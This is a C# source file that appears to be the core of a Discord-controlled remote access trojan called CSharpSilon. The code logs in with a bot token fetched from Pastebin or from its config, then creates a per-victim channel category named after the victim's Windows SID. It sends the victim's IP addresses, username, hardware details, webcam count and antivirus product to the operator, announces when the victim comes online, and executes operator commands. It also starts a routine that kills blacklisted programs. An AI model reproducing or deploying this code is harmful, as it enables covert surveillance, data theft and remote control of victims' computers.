using System;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using CSharpSilon.cmds;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;

namespace CSharpSilon.Utils
{
    public class Bot
    {
        
        private readonly DiscordSocketClient _client;
        private readonly CommandService _commands;
        private readonly IServiceProvider _services;
        public bool FirstRun;
        public bool SetUp;

        public static readonly string _userSid = WindowsIdentity.GetCurrent().User.Value;
        public static string Prefix = Config.Prefix;


        public static SocketTextChannel _info;
        public static SocketTextChannel _main;
        public static SocketTextChannel _spam;
        public static SocketTextChannel _file;
        public static SocketTextChannel _recordings;
        public static SocketVoiceChannel _voice;

        public Bot()
        {
            Task.Run(Processes.ManageBlacklistedPrograms);
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                LogLevel = LogSeverity.Info,
                AlwaysDownloadUsers = true,
                GatewayIntents = GatewayIntents.All
            });

            _commands = new CommandService();

            var serviceCollection = new ServiceCollection();
            serviceCollection.AddSingleton(_client);
            serviceCollection.AddSingleton(_commands);

            _services = serviceCollection.BuildServiceProvider();
        }

        public async Task RunAsync()
        {
            _client.Ready += OnReady;
            _client.MessageReceived += HandleCommandAsync;
            await RegisterCommandsAsync();
            
            // Goes Through All Of The Tokens To Use, And Uses The First One That's Valid.
            if (!Config.Pastebin)
            {
                foreach (var token in Config.Tokens)
                {
                    if (Discord.IsValid(token).Result)
                    {
                        Config.UsedToken = token;
                        break;
                    }

                    Thread.Sleep(500);
                }
            }
            else
            {
                var wc = new WebClient();
                // Sets The Request Headers
                wc.Headers.Add("User-Agent", @"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0");
                wc.Headers.Add("Host", "pastebin.com");
                
                // Gets The Token From The Pastebin
                var token = wc.DownloadString(Config.PastebinLink);
                
                // Checks If It's Valid
                if (Discord.IsValid(token).Result)
                {
                    Config.UsedToken = token;
                }
                
                // If The Token's Not Valid, It Goes Through All The Ones In Config.Tokens And Gets The First One That's Valid
                else
                {
                    foreach (var toke in Config.Tokens)
                    {
                        if (Discord.IsValid(toke).Result)
                        {
                            Config.UsedToken = toke;
                            break;
                        }

                        Thread.Sleep(500);
                    }
                }
            }

            await _client.LoginAsync(TokenType.Bot, Config.UsedToken);
            await _client.StartAsync();

            // Block the program until it is closed
            await Task.Delay(-1);
        }

        private async Task SettingUp()
        {
            
            var guild = _client.GetGuild(Config.GuildID);
            if (guild == null)
            {
                return;
            }


            // Fetches All Categories In The Server, Find's The One That Has The User's HWID
            var categories = guild.Channels
                .Where(c => c is ICategoryChannel)
                .Cast<ICategoryChannel>();
            var category = categories.FirstOrDefault(c => c.Name == _userSid);


            // If It Hasn't Already Been Set Up, It Sets It Up.
            if (!SetUp)
            {
                // If The Category Doesn't Exist, It Creates It.
                if (category == null)
                {
                    category = await guild.CreateCategoryChannelAsync(_userSid);

                    await guild.CreateTextChannelAsync("info", properties => properties.CategoryId = category.Id);
                    await guild.CreateTextChannelAsync("main", properties => properties.CategoryId = category.Id);
                    await guild.CreateTextChannelAsync("spam", properties => properties.CategoryId = category.Id);
                    await guild.CreateTextChannelAsync("file", properties => properties.CategoryId = category.Id);
                    await guild.CreateTextChannelAsync("recordings", properties => properties.CategoryId = category.Id);

                    await guild.CreateVoiceChannelAsync("voice", properties => properties.CategoryId = category.Id);

                    await Task.Delay(750);


                    // This Is Used To Determine If The User's Info Needs To Be Posted Again.
                    FirstRun = true;
                }
                else
                {
                    FirstRun = false;
                }
                SetUp = true;
            }

            
            // Fetches All Channels In The Category Correlating To The User.
            // If Any Of The Channels Are Null
            // It Searches 3 Times Before Rerunning The Method.
            int tryCount = 0;
            while (_main == null || _info == null || _spam == null || _file == null || _recordings == null ||
                   _voice == null && tryCount <= 3)
            {
                // Once It Hits 3 Tries, It Reruns The Methods
                if (tryCount == 3)
                {
                    await SettingUp();
                    return;
                }
                foreach (var ch in guild.CategoryChannels)
                {
                    if (ch == category)
                    {
                        foreach (var c in ch.Channels)
                        {
                            if (c.Name == "main" && c.GetChannelType() == ChannelType.Text)
                                _main = guild.GetTextChannel(c.Id);
                            if (c.Name == "info" && c.GetChannelType() == ChannelType.Text)
                                _info = guild.GetTextChannel(c.Id);
                            if (c.Name == "spam" && c.GetChannelType() == ChannelType.Text)
                                _spam = guild.GetTextChannel(c.Id);
                            if (c.Name == "file" && c.GetChannelType() == ChannelType.Text)
                                _file = guild.GetTextChannel(c.Id);
                            if (c.Name == "recordings" && c.GetChannelType() == ChannelType.Text)
                                _recordings = guild.GetTextChannel(c.Id);
                            if (c.Name == "voice" && c.GetChannelType() == ChannelType.Voice)
                                _voice = guild.GetVoiceChannel(c.Id);
                        }
                    }
                }
                tryCount++;
                Thread.Sleep(750);
            }

            // Sends The Info Message If The Info Channel Exists And It's Their First Time Running.
            if (_info != null && FirstRun && SetUp)
            {
                var embed = new EmbedBuilder()
                {
                    Title = "First Run Info",
                    Description = ""
                                  + "\n[IP]"
                                  + "\nExternal IP: " + SystemInfo.GetPublicIpAsync().Result
                                  + "\nInternal IP: " + SystemInfo.GetLocalIp()
                                  + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                                  + "\n"
                                  + "\n[Machine]"
                                  + "\nUsername: " + SystemInfo.Username
                                  + "\nCompname: " + SystemInfo.Compname
                                  + "\nSystem: " + SystemInfo.GetSystemVersion()
                                  + "\nCPU: " + SystemInfo.GetCpuName()
                                  + "\nGPU: " + SystemInfo.GetGpuName()
                                  + "\nRAM: " + SystemInfo.GetRamAmount()
                                  + "\nDate: " + SystemInfo.Datenow
                                  + "\nScreen: " + SystemInfo.ScreenMetrics()
                                  + "\nBattery: " + SystemInfo.GetBattery()
                                  + "\nWebcam Amount: " + Webcam.GetConnectedCamerasCount()
                                  + "\nAntivirus: " + SystemInfo.GetAntivirus(),
                    Color = Color.Magenta,
                }.Build();
                await _info.SendMessageAsync(embed: embed);
            }

            if (Config.StartupMessage)
            {
                if (_main != null)
                {
                    await _main.SendMessageAsync(Config.StartupPing ? "@everyone User Online" : "User Online");
                }
            }

        }
        
        

        private Task OnReady()
        {
            Console.WriteLine($"{_client.CurrentUser.Username} is online!");
            SettingUp();
            
            return Task.CompletedTask;
        }

        



        private async Task HandleCommandAsync(SocketMessage arg)
        {
            var message = arg as SocketUserMessage;
            var context = new SocketCommandContext(_client, message);

            if (message.Author.IsBot) return;
            var categories = context.Guild.Channels
                .Where(c => c is ICategoryChannel)
                .Cast<ICategoryChannel>();


            var category = categories.Where(c => c.Name == _userSid).Cast<SocketCategoryChannel>().FirstOrDefault();
            if (!Utils.Discord.IsChannelInCategory(message.Channel, category))
            {
                return;
            }

            int argPos = 0;
            if (message.HasStringPrefix(Prefix, ref argPos))
            {
                var result = await _commands.ExecuteAsync(context, argPos, _services);
                if (!result.IsSuccess)
                    await context.Channel.SendMessageAsync(result.ErrorReason);
            }
        }

        private async Task RegisterCommandsAsync()
        {
            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                var commandModuleTypes = assembly.GetTypes()
                    .Where(t => t.Namespace == "CSharpSilon.cmds"
                                && typeof(ModuleBase<SocketCommandContext>).IsAssignableFrom(t)
                                && t.IsClass
                                && !t.IsAbstract
                                && !t.IsSealed);
                foreach (var type in commandModuleTypes)
                {

                    await _commands.AddModuleAsync(type, _services);
                }
            }
            catch (Exception e)
            {
            }
        }
    }
}